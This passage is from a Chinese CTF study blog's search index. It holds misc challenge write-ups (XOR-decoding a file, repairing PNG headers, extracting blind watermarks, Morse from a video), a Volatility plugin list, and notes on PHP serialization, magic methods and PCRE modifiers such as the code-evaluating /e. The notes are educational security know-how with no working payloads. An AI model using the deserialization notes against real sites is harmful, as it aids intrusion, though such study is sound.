显示遍历VAD树</span><br><span class="line">vboxinfo        转储Virtualbox信息（虚拟机）</span><br><span class="line">verinfo         打印PE镜像中的版本信息</span><br><span class="line">vmwareinfo      转储VMware VMSS/VMSN 信息</span><br><span class="line">volshell        内存镜像中的shell</span><br><span class="line">windows         打印桌面窗口(详细信息)</span><br><span class="line">wintree         Z顺序打印桌面窗口树</span><br><span class="line">wndscan         池扫描窗口站</span><br><span class="line">yarascan        以Yara签名扫描进程或内核内存</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本篇文章演示的插件已经可以做绝大部分题目了，之后就多在 buuctf 或者 ctfshow 等线上 ctf 平台刷题，积累经验</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.7.24</title>
      <link href="/posts/e4f115d7.html"/>
      <url>/posts/e4f115d7.html</url>
      
        <content type="html"><![CDATA[<h2 id="你会异或吗"><a href="#你会异或吗" class="headerlink" title="你会异或吗"></a>你会异或吗</h2><p>将文件下载解压放进010editor，发现格式不对，根据题目提示“你会异或吗”和“0x50”，在010editor中对每个字节与0x50进行异或运算，得到完整图片。</p><h2 id="flag一分为二"><a href="#flag一分为二" class="headerlink" title="flag一分为二"></a>flag一分为二</h2><p>解压文件是一张png图片，放进010editor，运行模板中的png，在模板结果中找到宽高并修改。之后再用隐形水印工具提取盲水印。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240724183731995.png" alt="image-20240724183731995"></p><h2 id="you-and-me"><a href="#you-and-me" class="headerlink" title="you_and_me"></a>you_and_me</h2><p>两张图，猜测you.png是原图，you_and_me是加了盲水印的图，需要原图的提取盲水印想到blind watermark。（watermark解不出来）</p><h2 id="黑丝白丝还有什么丝"><a href="#黑丝白丝还有什么丝" class="headerlink" title="黑丝白丝还有什么丝"></a>黑丝白丝还有什么丝</h2><p>视频里按照黑丝白丝出现的顺序和转场变化，依次记录，（白黑黑、白白白白黑、黑白、黑、黑、黑黑黑黑黑、黑白白白、白白白黑黑、黑黑、黑黑黑、白黑白、白、黑白黑白、白白黑、黑、白、白白。最后两个白白应该是拜拜的意思）然后放进</p><p>摩斯密码解密。（多来点这种题（手动滑稽））</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240724224604185.png" alt="image-20240724224604185"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.7.23</title>
      <link href="/posts/7a958074.html"/>
      <url>/posts/7a958074.html</url>
      
        <content type="html"><![CDATA[<h2 id="ctf秀新手笔刷题"><a href="#ctf秀新手笔刷题" class="headerlink" title="ctf秀新手笔刷题"></a>ctf秀新手笔刷题</h2><h3 id="杂项签到"><a href="#杂项签到" class="headerlink" title="杂项签到"></a>杂项签到</h3><p>下载文件后解压，是一张图片，放进010editor，搜索ctf，找到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240723204704886.png" alt="image-20240723204704886"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240723204723218.png" alt="image-20240723204723218"></p><h3 id="损坏的压缩包"><a href="#损坏的压缩包" class="headerlink" title="损坏的压缩包"></a>损坏的压缩包</h3><p>打开压缩包，发现打不开，确实是损坏的压缩包。损坏的话可能是格式不太对，或者格式对了但是内容有问题</p><p>图片的格式可以用dat图的前两个字节来区别， jpg= FF D8，png =89 50，gif =47 49，Bmp=42 4D</p><p>丢进010editor看下，前两个字节是89 50，这个文件头标识对应的是png。把文件的后缀改成png就能正常显示了。</p><p>揣测了一下出题人出这道题，感觉很好出的，只要随便找张图片拿画图软件画上flag，然后把前两个字节改掉</p><h3 id="谜之阑珊"><a href="#谜之阑珊" class="headerlink" title="谜之阑珊"></a>谜之阑珊</h3><p>比较两文件不同，扔进010editor，比较文件就能查看</p><h3 id="你会数数吗"><a href="#你会数数吗" class="headerlink" title="你会数数吗"></a>你会数数吗</h3><p>题目提示“你会数数吗”，统计每个字符出现的词频，然后降序排列，得到flag(脚本)</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>序列化和反序列化</title>
      <link href="/posts/83d613f6.html"/>
      <url>/posts/83d613f6.html</url>
      
        <content type="html"><![CDATA[<p>网站：【CTF_Web：反序列化学习笔记（一）php中的类与对象 - CSDN App】<a href="http://t.csdnimg.cn/8DZX7">http://t.csdnimg.cn/8DZX7</a><br>【CTF_Web：反序列化学习笔记（二）CTF经典考题由浅至深 - CSDN App】<a href="http://t.csdnimg.cn/NNftL">http://t.csdnimg.cn/NNftL</a></p><p>数组序列化<br>原数组： [‘a’=&gt;’str’, ‘b’=&gt;1, ‘c’=&gt;false]<br>序列化后： a:3:{s:1:”a”;s:3:”str”;s:1:”b”;i:1;s:1:”b”;i:1;s:1:”c”;b:0;}</p><p>对象序列化<br>对于PHP中的类C，属性 data=”abc” 会被序列化为不同的形式（%00代表空字符）<br> Public属性： s:4:”data”;s:3:”abc”<br> Private属性： s:7”%00C%00data”;s:3:”abc”<br> Protected属性： s:7”%00*%00data”;s:3:”abc”</p><p>其它数据类型<br>String（字符串）：s<br> Integer（整型）：i<br> Bool（Bool型）：b<br> NULL：N<br> Array（数组）：a<br> Object（对象）：o</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__construct</span>()   <span class="comment">//对象创建(new)时会自动调用。</span></span><br><span class="line"><span class="built_in">__wakeup</span>()        <span class="comment">//使用unserialize时触发</span></span><br><span class="line"><span class="built_in">__sleep</span>()        <span class="comment">//使用serialize时触发</span></span><br><span class="line"><span class="built_in">__destruct</span>()        <span class="comment">//对象被销毁时触发</span></span><br><span class="line"><span class="built_in">__call</span>()        <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="built_in">__callStatic</span>()        <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="built_in">__get</span>()        <span class="comment">//用于从不可访问的属性读取数据 包括private或者是不存在的</span></span><br><span class="line"><span class="built_in">__set</span>()        <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="built_in">__isset</span>()        <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="built_in">__unset</span>()         <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="built_in">__toString</span>()    <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="built_in">__invoke</span>()             <span class="comment">//当脚本尝试将对象调用为函数时触发  就是加了括号</span></span><br><span class="line"><span class="built_in">__autoload</span>()           <span class="comment">//在代码中当调用不存在的类时会自动调用该方法。</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式中各种前缀和后缀含义</title>
      <link href="/posts/ea68741d.html"/>
      <url>/posts/ea68741d.html</url>
      
        <content type="html"><![CDATA[<p>前缀：<br>‘.’代表着匹配前面的单个字符，<br>‘+’代表匹配一次或者是多次，<br>‘+？’代表重复一次或者多次，尽可能的少重复</p><p>后缀：<br>i ：(PCRE_CASELESS)<br>　　如果设定此修正符，模式中的字符将同时匹配大小写字母。<br>m：（PCRE_MULTILINE）<br>　　默认情况下，PCRE 将目标字符串作为单一的一“行”字符所组成的（甚至其中包含有换行符也是如此）。“行起始”元字符（^）仅仅匹配字符串的起始，“行结束”元字符（）仅仅匹配字符串的结束，或者最后一个字符是换行符时其前面（除非设定了D修正符）。这和Perl是一样的。　　当设定了此修正符，“行起始”和“行结束”除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。这和Perl的/m修正符是等效的。如果目标字符串中没有“\n”字符或者模式中没有或<br>，则设定此修正符没有任何效果。<br>s：（PCRE_DOTALL）<br>　　如果设定了此修正符，模式中的圆点元字符（.）匹配所有的字符，包括换行符（一般情况下‘.’是不能匹配‘\n’的）。没有此设定的话，则不包括换行符。这和 Perl 的 /s 修正符是等效的。排除字符类例如 <sup><a href="#fn_a" id="reffn_a">a</a></sup> 总是匹配换行符的，无论是否设定了此修正符。<br>x：（PCRE_EXTENDED）<br>　　如果设定了此修正符，模式中的空白字符除了被转义的或在字符类中 的以外完全被忽略，在未转义的字符类之外的 # 以及下一个换行符之间的所有字符，包括两头，也都被忽略。这和 Perl 的 /x 修正符是等效的，使得可以在复杂的模式中加入注释。然而注意，这仅适用于数据字符。空白字符可能永远不会出现于模式中的特殊字符序列，例如引入条件子模式 的序列 (?( 中间。<br>e：<br>　　如果设定了此修正符，preg_replace() 在替换字符串中对逆向引用作正常的替换，将其作为 PHP 代码求值，并用其结果来替换所搜索的字符串。<br>　　只有 preg_replace() 使用此修正符，其它 PCRE 函数将忽略之。<br>　　注: 本修正符在 PHP3 中不可用。<br>A：（PCRE_ANCHORED）<br>　　如果设定了此修正符，模式被强制为“anchored”，即强制仅从目标字符串的开头开始匹配。此效果也可以通过适当的模式本身来实现（在 Perl 中实现的唯一方法）。<br>D：（PCRE_DOLLAR_ENDONLY）<br>　　如果设定了此修正符，模式中的美元元字符仅匹配目标字符串的结尾。没有此选项时，如果　　最后一个字符是换行符的话，美元符号也会匹配此字符之前（但不会匹配任何其它换行符之前）。如果设定了 m 修正符则忽略此选项。Perl 中没有与其等价的修正符。<br>S：<br>　　当一个模式将被使用若干次时，为加速匹配起见值得先对其进行分析。如果设定了此修正符则会进行额外的分析。目前，分析一个模式仅对没有单一固定起始字符的 non-anchored 模式有用。<br>U：（PCRE_UNGREEDY）<br>　　本修正符反转了匹配数量的值使其不是默认的重复，而变成在后面跟上“?”才变得重复。这和 Perl 不兼容。也可以通过在模式之中设定 (?U) 修正符或者在数量符之后跟一个问号（如 .*?）来启用此选项。<br>X（PCRE_EXTRA）<br>　　此修正符启用了一个 PCRE 中与 Perl 不兼容的额外功能。模式中的任何反斜线后面跟上一个没有特殊意义的字母导致一个错误，从而保留此组合以备将来扩充。默认情况下，和 Perl 一样，一个反斜线后面跟一个没有特殊意义的字母被当成该字母本身。当前没有其它特性受此修正符控制。<br>u（PCRE_UTF8）<br>　　此修正符启用了一个 PCRE 中与 Perl 不兼容的额外功能。模式字符串被当成 UTF-8。本修正符在 Unix 下自 PHP 4.1.0 起可用，在 win32 下自 PHP 4.2.3 起可用。自 PHP 4.3.5 起开始检查模式的 UTF-8 合法性。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
